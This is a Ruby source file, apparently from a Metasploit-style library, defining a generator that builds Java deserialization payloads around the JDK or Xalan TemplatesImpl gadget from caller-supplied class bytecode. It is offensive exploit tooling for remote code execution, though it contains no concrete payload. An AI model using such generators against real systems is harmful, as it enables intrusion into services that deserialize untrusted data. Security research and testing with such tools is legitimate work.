# -*- coding: binary -*-
module Rex
  module Java
    module Serialization
      module Generator
        class Templates
          def self.supported(ctx,params)
            if ctx.flag?('nojdktemplates') &&
                !ctx.class?('org.apache.xalan.xsltc.trax.TemplatesImpl')
              return false
            end

            if !params.fetch("classfiles",nil).nil?
              return true
            end
            false
          end


          def self.use_xalan?(ctx)
            if ctx.flag?('nojdktemplates') &&
                ctx.class?('org.apache.xalan.xsltc.trax.TemplatesImpl')
              return true
            end
            return false
          end

          def self.make(ctx, params)
            xalan = use_xalan?(ctx)
            if ctx.flag?('nojdktemplates') &&
                !ctx.class?('org.apache.xalan.xsltc.trax.TemplatesImpl')
              raise "TemplateImpl not supported"
            end

            # this is a bit of a hen and egg problem:
            # classfiles needs to contain the AbstractTranslet
            # matching the chosen implementation 
            bytecodes = params.fetch("classfiles",nil)
            if bytecodes.nil? || bytecodes.length == 0
              raise "No bytecode specified"
            end

            if xalan
              ctx.reg.load('model/xalan-templates.json')
              Rex::Java::Serialization::Payloads::Templates.make_xalan(bytecodes) 
            else
              ctx.reg.load('model/jdk-templates.json')
              Rex::Java::Serialization::Payloads::Templates.make_jdk(bytecodes)
            end
          end
        end
      end
    end
  end
end
